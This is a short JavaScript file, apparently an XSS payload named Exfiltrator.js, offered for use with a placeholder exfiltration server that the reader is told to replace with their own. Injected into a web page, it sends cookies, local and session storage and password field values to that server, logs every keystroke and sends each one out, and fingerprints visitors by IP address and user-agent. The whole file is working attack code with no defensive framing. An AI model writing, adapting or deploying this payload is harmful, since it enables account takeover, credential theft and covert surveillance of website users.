// 🚨 XSS Payload Loaded Alert
alert("🚀 XSS Payload Loaded! Exfiltrating Data...");

// 📡 Your Exfiltration Server (Change this to your server)
const EXFIL_SERVER = "https://YOUR-SERVER.com/exfil"; 

// 📌 Function to send data
function sendData(data, type) {
    fetch(`${EXFIL_SERVER}?type=${type}&data=` + encodeURIComponent(data))
        .catch(err => console.error("Exfiltration Failed:", err));
}

// 🥷 Steal Cookies
if (document.cookie) sendData(document.cookie, "cookies");

// 🗄️ Steal Local Storage
if (localStorage.length > 0) sendData(JSON.stringify(localStorage), "localStorage");

// 💾 Steal Session Storage
if (sessionStorage.length > 0) sendData(JSON.stringify(sessionStorage), "sessionStorage");

// 🎯 Steal Form Inputs (Only password fields)
document.querySelectorAll("input[type=password]").forEach(input => {
    sendData(input.value, "password");
});

// 🔑 Capture Keystrokes (Keylogger)
document.addEventListener("keypress", (e) => {
    sendData(e.key, "keystroke");
});

// 📍 Get User's IP & User-Agent
fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(data => sendData(data.ip + " | " + navigator.userAgent, "fingerprint"));

// 📤 Confirm Data Sent
console.log("✅ Exfiltrator.js: Data Sent!");
